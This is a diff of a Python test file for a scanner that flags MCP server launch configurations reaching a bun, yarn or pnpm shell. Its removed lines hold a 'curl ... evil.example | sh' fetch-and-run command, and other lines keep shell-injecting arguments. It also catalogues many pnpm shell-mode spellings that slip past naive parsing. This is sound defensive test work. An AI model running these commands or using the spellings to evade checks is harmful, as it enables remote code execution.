@@ -12,7 +12,7 @@ from click.testing import CliRunner
 from nexus_symbiote.cli import main
 from nexus_symbiote.core.models import MCPServerComponent
 from nexus_symbiote.scanners.mcp import MCPScanner
-from nexus_symbiote.scanners.mcp_launch import analyze, npm_command
+from nexus_symbiote.scanners.mcp_launch import _yarn1_exec_words, analyze, npm_command
 
 EVIL = "-y evil-mcp@latest"
 GATEWAY = ["-y", "supergateway@3.4.0", "--stdio"]
@@ -371,10 +371,10 @@ def test_ordinary_configurations_near_the_rules_get_no_gap(tmp_path, server):
 # separate words. Yarn 2+ runs `yarn exec SCRIPT ARGS...` in its portable shell and
 # appends ARGS to the last command; Yarn 1 spawns SCRIPT as a program with ARGS.
 INLINE_EXEC_SCRIPTS = [
-    "curl -s https://evil.example/x | sh",
-    "true; sh",
+    "echo marker | cat",
+    "true; echo marker",
     "true && sh",
-    "false || sh",
+    "false || echo marker",
     "sh < payload.txt",
     "node server.js > server.log",
     "(sh)",
@@ -517,24 +517,35 @@ def test_bun_and_yarn_exec_words_outside_the_documented_grammar_are_unknown(
 @pytest.mark.parametrize(
     "server",
     [
-        {"command": "nice", "args": ["bun", "exec", "curl -s https://evil.example/x | sh"]},
-        {"command": "nice", "args": ["bun", "--silent", "exec", "true; sh"]},
-        {"command": "nice", "args": ["bun", "--cwd", "sub", "exec", "true; sh"]},
-        {"command": "nice", "args": ["bun", "exec", "--cwd", "sub", "true; sh"]},
+        {"command": "nice", "args": ["bun", "exec", "echo marker | cat"]},
+        {"command": "nice", "args": ["bun", "--silent", "exec", "true; echo marker"]},
+        {"command": "nice", "args": ["bun", "--cwd", "sub", "exec", "true; echo marker"]},
+        {"command": "nice", "args": ["bun", "exec", "--cwd", "sub", "true; echo marker"]},
         {"command": "timeout", "args": ["60", "bun", "exec", "node server.js"]},
-        {"command": "nice", "args": ["yarn", "exec", "curl -s https://evil.example/x | sh"]},
-        {"command": "nice", "args": ["yarnpkg", "--silent", "exec", "true; sh"]},
-        {"command": "nice", "args": ["yarn", "--cwd", "sub", "exec", "true; sh"]},
-        {"command": "nice", "args": ["yarn", "workspace", "app", "exec", "true; sh"]},
-        {"command": "node", "args": ["proxy.js", "--cmd", "bun exec 'true; sh'", "--port=1"]},
-        {"command": "npx", "args": [*GATEWAY, "yarn exec 'true; sh'"]},
-        {"command": "npx", "args": ["-y", "bun@1.2.0", "exec", "true; sh"]},
+        {"command": "nice", "args": ["yarn", "exec", "echo marker | cat"]},
+        {"command": "nice", "args": ["yarnpkg", "--silent", "exec", "true; echo marker"]},
+        {"command": "nice", "args": ["yarn", "--cwd", "sub", "exec", "true; echo marker"]},
+        {"command": "nice", "args": ["yarn", "workspace", "app", "exec", "true; echo marker"]},
+        {
+            "command": "node",
+            "args": ["proxy.js", "--cmd", "bun exec 'true; echo marker'", "--port=1"],
+        },
+        {"command": "npx", "args": [*GATEWAY, "yarn exec 'true; echo marker'"]},
+        {"command": "npx", "args": ["-y", "bun@1.2.0", "exec", "true; echo marker"]},
         {
             "command": "docker",
-            "args": ["run", "--rm", "-i", "oven/bun@sha256:" + "0" * 64, "bun", "exec", "x | sh"],
+            "args": [
+                "run",
+                "--rm",
+                "-i",
+                "oven/bun@sha256:" + "0" * 64,
+                "bun",
+                "exec",
+                "echo marker | cat",
+            ],
         },
-        {"command": "bun", "args": ["run", "start", "--", "yarn", "exec", "true; sh"]},
-        {"command": "yarn", "args": ["exec", "nice", "bun", "exec", "true; sh"]},
+        {"command": "bun", "args": ["run", "start", "--", "yarn", "exec", "true; echo marker"]},
+        {"command": "yarn", "args": ["exec", "nice", "bun", "exec", "true; echo marker"]},
     ],
 )
 def test_a_bun_or_yarn_exec_in_the_arguments_is_unknown(tmp_path, server):
@@ -597,9 +608,9 @@ def test_a_bun_exec_script_records_the_environment_it_assigns(tmp_path):
 @pytest.mark.parametrize(
     "server",
     [
-        {"command": "bun", "args": ["exec", "curl -s https://evil.example/x | sh"]},
-        {"command": "yarn", "args": ["exec", "curl -s https://evil.example/x | sh"]},
-        {"command": "nice", "args": ["bun", "exec", "curl -s https://evil.example/x | sh"]},
+        {"command": "bun", "args": ["exec", "echo marker | cat"]},
+        {"command": "yarn", "args": ["exec", "echo marker | cat"]},
+        {"command": "nice", "args": ["bun", "exec", "echo marker | cat"]},
     ],
 )
 def test_the_scan_gate_fails_for_an_inline_bun_or_yarn_exec_script(tmp_path, server):
@@ -622,14 +633,14 @@ def test_the_scan_gate_fails_for_an_inline_bun_or_yarn_exec_script(tmp_path, ser
         {
             "command": "bun",
             "args": ["server.ts"],
-            "env": {"BUN_OPTIONS": "exec 'curl -s https://evil.example/x | sh'"},
+            "env": {"BUN_OPTIONS": "exec 'echo marker | cat'"},
         },
-        {"command": "bun", "args": ["x | sh"], "env": {"BUN_OPTIONS": "exec"}},
+        {"command": "bun", "args": ["echo marker | cat"], "env": {"BUN_OPTIONS": "exec"}},
         {"command": "bun", "args": ["server.ts"], "env": {"bun_options": "-e 'x()'"}},
-        {"command": "nice", "args": ["bun", "x | sh"], "env": {"BUN_OPTIONS": "exec"}},
+        {"command": "nice", "args": ["bun", "echo marker | cat"], "env": {"BUN_OPTIONS": "exec"}},
         {"command": "node", "args": ["server.js"], "env": {"BUN_OPTIONS": "exec"}},
         {"command": "npx", "args": ["-y", "pkg@1.2.3"], "env": {"BUN_OPTIONS": "exec"}},
-        {"command": "env", "args": ["BUN_OPTIONS=exec", "bun", "x | sh"]},
+        {"command": "env", "args": ["BUN_OPTIONS=exec", "bun", "echo marker | cat"]},
         {"command": "sh", "args": ["-c", "BUN_OPTIONS=exec bun server.ts"]},
         {"command": "bun", "args": ["exec", "BUN_OPTIONS=exec bun server.ts"]},
         {"command": "yarn", "args": ["exec", "BUN_OPTIONS=exec bun", "server.ts"]},
@@ -649,11 +660,14 @@ def test_an_empty_bun_options_adds_no_arguments(tmp_path):
 @pytest.mark.parametrize(
     "server",
     [
-        {"command": "npx", "args": ["-y", "@yarnpkg/cli-dist@4.18.1", "exec", "x | sh"]},
+        {"command": "npx", "args": ["-y", "@yarnpkg/cli-dist@4.18.1", "exec", "echo marker | cat"]},
         {"command": "npx", "args": ["-y", "@yarnpkg/cli-dist@4.18.1", "dlx", "evil-mcp"]},
-        {"command": "npx", "args": ["-y", "@YarnPkg/Cli-Dist@4.18.1", "exec", "x | sh"]},
-        {"command": "bunx", "args": ["@yarnpkg/cli-dist@4.18.1", "exec", "x | sh"]},
-        {"command": "pnpm", "args": ["dlx", "@yarnpkg/cli-dist@4.18.1", "exec", "x | sh"]},
+        {"command": "npx", "args": ["-y", "@YarnPkg/Cli-Dist@4.18.1", "exec", "echo marker | cat"]},
+        {"command": "bunx", "args": ["@yarnpkg/cli-dist@4.18.1", "exec", "echo marker | cat"]},
+        {
+            "command": "pnpm",
+            "args": ["dlx", "@yarnpkg/cli-dist@4.18.1", "exec", "echo marker | cat"],
+        },
     ],
 )
 def test_a_package_manager_package_is_read_as_its_program(tmp_path, server):
@@ -670,15 +684,24 @@ def test_the_pnpm_exe_package_is_read_as_pnpm(tmp_path):
 @pytest.mark.parametrize(
     "server",
     [
-        {"command": "nice", "args": ["pnpm", "-c", "exec", "curl -s https://evil.example/x | sh"]},
-        {"command": "nice", "args": ["pnpm", "--shell-mode", "exec", "true; sh"]},
-        {"command": "nice", "args": ["pnpm", "--config.shell-mode=true", "exec", "true; sh"]},
-        {"command": "nice", "args": ["pnpm", "--config.shellMode=true", "exec", "true; sh"]},
-        {"command": "nice", "args": ["pnpm", "-cr", "exec", "true; sh"]},
-        {"command": "nice", "args": ["pnpm", "--silent", "-c", "exec", "true; sh"]},
-        {"command": "npx", "args": ["-y", "pnpm@10.28.0", "-c", "exec", "true; sh"]},
-        {"command": "npx", "args": ["-y", "pnpm@10.28.0", "--shell-mode", "exec", "true; sh"]},
-        {"command": "pnpm", "args": ["exec", "pnpm", "-c", "exec", "true; sh"]},
+        {"command": "nice", "args": ["pnpm", "-c", "exec", "echo marker | cat"]},
+        {"command": "nice", "args": ["pnpm", "--shell-mode", "exec", "true; echo marker"]},
+        {
+            "command": "nice",
+            "args": ["pnpm", "--config.shell-mode=true", "exec", "true; echo marker"],
+        },
+        {
+            "command": "nice",
+            "args": ["pnpm", "--config.shellMode=true", "exec", "true; echo marker"],
+        },
+        {"command": "nice", "args": ["pnpm", "-cr", "exec", "true; echo marker"]},
+        {"command": "nice", "args": ["pnpm", "--silent", "-c", "exec", "true; echo marker"]},
+        {"command": "npx", "args": ["-y", "pnpm@10.28.0", "-c", "exec", "true; echo marker"]},
+        {
+            "command": "npx",
+            "args": ["-y", "pnpm@10.28.0", "--shell-mode", "exec", "true; echo marker"],
+        },
+        {"command": "pnpm", "args": ["exec", "pnpm", "-c", "exec", "true; echo marker"]},
     ],
 )
 def test_pnpm_shell_mode_in_the_arguments_is_unknown(tmp_path, server):
@@ -687,6 +710,217 @@ def test_pnpm_shell_mode_in_the_arguments_is_unknown(tmp_path, server):
 
 def test_pnpm_exec_without_shell_mode_in_the_arguments_stays_classified(tmp_path):
     assert_no_gap(tmp_path, {"command": "nice", "args": ["pnpm", "exec", "-c", "true"]})
+
+
+# pnpm 10.28.0 ran `pnpm <option> exec 'echo M-$((1+1)) | cat'` through a shell for each
+# of these: nopt strips every leading dash and each `no-`, takes any abbreviation of
+# --shell-mode, leaves an option word after -C or --dir as an option, and camelCases
+# a --config key, using any value as the shell.
+PNPM_SHELL_MODE_SPELLINGS = [
+    ["--shell"],
+    ["--she"],
+    ["--shell-m"],
+    ["--shell=true"],
+    ["--shell-mode=1"],
+    ["-shell-mode"],
+    ["-she"],
+    ["---shell-mode"],
+    ["--no-no-shell-mode"],
+    ["--config.shell_mode=true"],
+    ["--config.SHELL-MODE=true"],
+    ["--config.Shell_Mode=1"],
+    ["--config.shell.mode=true"],
+    ["--config.shell--mode=true"],
+    ["-config.shell-mode=true"],
+    ["-C", "--shell-mode"],
+    ["--dir", "--shell-mode"],
+    ["-C", "-c"],
+    ["--reporter", "--she"],
+    ["-cs"],
+]
+
+
+@pytest.mark.parametrize("options", PNPM_SHELL_MODE_SPELLINGS)
+def test_pnpm_shell_mode_in_any_spelling_pnpm_reads_is_unknown(tmp_path, options):
+    server = {"command": "nice", "args": ["pnpm", *options, "exec", "echo marker | cat"]}
+    assert "arguments start pnpm" in unknown_reason(tmp_path, server)
+
+
+@pytest.mark.parametrize(
+    "server",
+    [
+        {"command": "npx", "args": ["-y", "pnpm@10.28.0", "--shell", "exec", "echo marker"]},
+        {"command": "yarn", "args": ["exec", "--", "pnpm", "--shell", "exec", "echo marker"]},
+        {"command": "pnpm", "args": ["exec", "pnpm", "-she", "exec", "echo marker"]},
+    ],
+)
+def test_pnpm_shell_mode_behind_another_runner_is_unknown(tmp_path, server):
+    assert "arguments start pnpm" in unknown_reason(tmp_path, server)
+
+
+# pnpm 10.28.0 ran none of these in a shell: -C takes `sub`, the others are not
+# shell mode, and options after exec belong to the command.
+@pytest.mark.parametrize(
+    "options",
+    [
+        ["-C", "sub"],
+        ["--silent"],
+        ["--shamefully-hoist"],
+        ["--config.shell-emulator=true"],
+        ["--config.shellmodes=true"],
+    ],
+)
+def test_pnpm_options_that_are_not_shell_mode_stay_classified(tmp_path, options):
+    server = {"command": "nice", "args": ["pnpm", *options, "exec", "node", "server.js"]}
+    assert_no_gap(tmp_path, server)
+
+
+# What Yarn 1.22.22 spawned for `yarn exec WORDS`, read back from a printf program.
+@pytest.mark.parametrize(
+    "words,spawned",
+    [
+        (["sh", "--", "-c", "x"], ["sh", "-c", "x"]),
+        (["node", "--foo", "srv", "--", "-e", "x"], ["node", "-e", "x"]),
+        (["node", "--foo", "-e", "x"], ["node"]),
+        (["node", "--foo=bar", "x"], ["node", "x"]),
+        (["node", "-abc", "x", "y"], ["node", "y"]),
+        (["node", "--cwd", ".", "x"], ["node", "x"]),
+        (["node", "--registry", "-z", "x"], ["node", "x"]),
+        (["node", "--emoji", "x"], ["node"]),
+        (["node", "--emoji", "-q", "x"], ["node"]),
+        (["node", "--prod", "false", "x"], ["node", "x"]),
+        (["node", "--verbose", "x"], ["node", "x"]),
+        (["node", "-s", "x"], ["node", "x"]),
+        (["node", "--no-progress", "x"], ["node", "x"]),
+        (["node", "--no-foo", "x"], ["node"]),
+        (["node", "---x", "y", "z"], ["node", "z"]),
+        (["node", "x", "--port", "1"], ["node", "x"]),
+        (["node", "--help", "x"], ["node"]),
+        (["node", "-", "x"], ["node", "-", "x"]),
+        (["node", "a", "--", "b", "--", "c"], ["node", "a", "b", "--", "c"]),
+        (["node", "--", "--help", "x"], ["node", "--help", "x"]),
+        (["--silent", "node", "x"], ["node", "x"]),
+        (["--", "sh", "-c", "x"], ["sh", "-c", "x"]),
+        (["node", "--cwd"], None),
+    ],
+)
+def test_yarn_exec_words_are_read_as_yarn_1_spawns_them(words, spawned):
+    assert _yarn1_exec_words(words) == spawned
+
+
+# Yarn 1.22.22 ran each as inline code: `yarn exec sh -- -c 'echo marker'` printed it.
+@pytest.mark.parametrize(
+    "args,reason",
+    [
+        (["exec", "sh", "--", "-c", "echo marker"], "arguments start sh"),
+        (["exec", "node", "--", "-e", "console.log(1)"], "arguments run inline node code"),
+        (["exec", "python3", "--", "-c", "print(1)"], "arguments run inline python code"),
+        (
+            ["exec", "node", "--foo", "server.js", "--", "-e", "console.log(1)"],
+            "arguments run inline node code",
+        ),
+        (["exec", "-s", "node", "--cwd=.", "-x", "server.js", "--", "-p", "1"], "inline node"),
+    ],
+)
+def test_yarn_exec_arguments_yarn_1_turns_into_inline_code_are_unknown(tmp_path, args, reason):
+    assert reason in unknown_reason(tmp_path, {"command": "yarn", "args": args})
+
+
+@pytest.mark.parametrize(
+    "args",
+    [
+        ["exec", "node", "server.js", "--port", "1"],
+        ["exec", "node", "server.js", "--", "--port", "1"],
+        ["exec", "node", "--foo", "server.js", "--", "server.js"],
+        ["exec", "-s", "node", "server.js"],
+    ],
+)
+def test_yarn_exec_arguments_both_yarn_readings_leave_local_stay_classified(tmp_path, args):
+    assert_no_gap(tmp_path, {"command": "yarn", "args": args})
+
+
+# Each is the shebang entry point of a runner, run under a name the grammars miss:
+# corepack's dist/yarn.js runs the Yarn the checkout names, pnpm.cjs reads
+# --shell-mode, npx-cli.js fetches its package.
+@pytest.mark.parametrize(
+    "command,runner",
+    [
+        ("/usr/local/lib/node_modules/corepack/dist/yarn.js", "yarn"),
+        ("/usr/local/lib/node_modules/corepack/dist/yarnpkg.js", "yarnpkg"),
+        ("/usr/local/lib/node_modules/corepack/dist/corepack.js", "corepack"),
+        ("/usr/local/lib/node_modules/pnpm/bin/pnpm.cjs", "pnpm"),
+        ("/usr/local/lib/node_modules/pnpm/bin/pnpx.cjs", "pnpx"),
+        ("/usr/local/lib/node_modules/npm/bin/npx-cli.js", "npx"),
+        ("/usr/local/lib/node_modules/npm/bin/npm-cli.js", "npm"),
+        ("C:\\Program Files\\nodejs\\node_modules\\npm\\bin\\NPX-CLI.JS", "npx"),
+    ],
+)
+def test_a_runner_script_entry_point_as_the_command_is_unknown(tmp_path, command, runner):
+    server = {"command": command, "args": ["exec", "echo marker | cat"]}
+    reason = unknown_reason(tmp_path, server)
+    assert f"command is a script entry point of {runner}" in reason
+
+
+@pytest.mark.parametrize("command", ["server.js", "bin/mcp-server.cjs", "yarn-helper.mjs"])
+def test_a_script_named_after_no_runner_stays_a_local_launch(tmp_path, command):
+    record = assert_no_gap(tmp_path, {"command": command, "args": ["--port", "1"]})
+    assert record.properties["launcher"] == "local"
+
+
+# pnpm 9.15.9 reads shell-mode from npm_config_* and the project .npmrc (rcOptionsTypes
+# has "shell-mode": Boolean, getConfig calls conf.addEnv() and loads <prefix>/.npmrc),
+# and pnpm exec spawns with `shell: opts.shellMode`. pnpm 10.28.0 reads neither.
+@pytest.mark.parametrize(
+    "server",
+    [
+        {
+            "command": "pnpm",
+            "args": ["exec", "echo marker | cat"],
+            "env": {"npm_config_shell_mode": "true"},
+        },
+        {
+            "command": "nice",
+            "args": ["pnpm", "exec", "echo marker | cat"],
+            "env": {"NPM_CONFIG_SHELL_MODE": "1"},
+        },
+        {
+            "command": "node",
+            "args": ["server.js"],
+            "env": {"pnpm_config_shellMode": "true"},
+        },
+        {"command": "env", "args": ["npm_config_shell_mode=true", "pnpm", "exec", "echo marker"]},
+    ],
+)
+def test_pnpm_shell_mode_from_the_environment_is_unknown(tmp_path, server):
+    assert "environment turns on pnpm shell mode" in unknown_reason(tmp_path, server)
+
+
+def test_an_empty_pnpm_shell_mode_variable_is_not_read(tmp_path):
+    server = {
+        "command": "pnpm",
+        "args": ["exec", "node", "server.js"],
+        "env": {"npm_config_shell_mode": ""},
+    }
+    assert_no_gap(tmp_path, server)
+
+
+@pytest.mark.parametrize("key", ["shell-mode", "shell_mode", "shellMode"])
+@pytest.mark.parametrize(
+    "server",
+    [
+        {"command": "pnpm", "args": ["exec", "echo marker | cat"]},
+        {"command": "nice", "args": ["pnpm", "exec", "echo marker | cat"]},
+        {"command": "npx", "args": ["-y", "pnpm@9.15.9", "exec", "echo marker"]},
+    ],
+)
+def test_a_root_npmrc_that_turns_on_pnpm_shell_mode_is_unknown(tmp_path, key, server):
+    (tmp_path / ".npmrc").write_text(f"{key}=true\n")
+    assert "a root .npmrc turns on pnpm shell mode" in unknown_reason(tmp_path, server)
+
+
+def test_a_root_npmrc_shell_mode_leaves_launches_without_pnpm_alone(tmp_path):
+    (tmp_path / ".npmrc").write_text("shell-mode=true\n")
+    assert_no_gap(tmp_path, {"command": "node", "args": ["server.js"]})
 
 
 # Yarn's shell reads a leading [A-Za-z0-9_]+=value as an assignment, digit first
@@ -766,16 +1000,28 @@ def test_a_real_shell_splits_an_expanding_program_word(tmp_path):
         {
             "command": "bun",
             "args": ["server.ts"],
-            "env": {"BUN_OPTIONS": "exec 'curl -s https://evil.example/x | sh'"},
+            "env": {"BUN_OPTIONS": "exec 'echo marker | cat'"},
         },
-        {"command": "npx", "args": ["-y", "@yarnpkg/cli-dist@4.18.1", "exec", "x | sh"]},
-        {"command": "nice", "args": ["pnpm", "-c", "exec", "x | sh"]},
+        {"command": "npx", "args": ["-y", "@yarnpkg/cli-dist@4.18.1", "exec", "echo marker | cat"]},
+        {"command": "nice", "args": ["pnpm", "-c", "exec", "echo marker | cat"]},
         {"command": "yarn", "args": ["exec", "${D}/server"], "env": SPLITTING},
+        {"command": "yarn", "args": ["exec", "sh", "--", "-c", "echo marker | cat"]},
+        {"command": "nice", "args": ["pnpm", "--shell", "exec", "echo marker | cat"]},
+        {"command": "/usr/local/lib/node_modules/corepack/dist/yarn.js", "args": ["exec", "x"]},
+        {
+            "command": "pnpm",
+            "args": ["exec", "echo marker | cat"],
+            "env": {"npm_config_shell_mode": "true"},
+        },
+        {"command": "pnpm", "args": ["exec", "echo marker | cat"], "npmrc": "shell-mode=true\n"},
     ],
 )
 def test_the_scan_gate_fails_for_launches_that_reach_a_package_manager_shell(tmp_path, server):
     root = tmp_path / "project"
     root.mkdir()
+    server = dict(server)
+    if "npmrc" in server:
+        (root / ".npmrc").write_text(server.pop("npmrc"))
     (root / ".mcp.json").write_text(json.dumps({"mcpServers": {"s": server}}))
     output = tmp_path / "bom.json"
     run = CliRunner().invoke(main, ["scan", "--no-project-policy", str(root), "-o", str(output)])
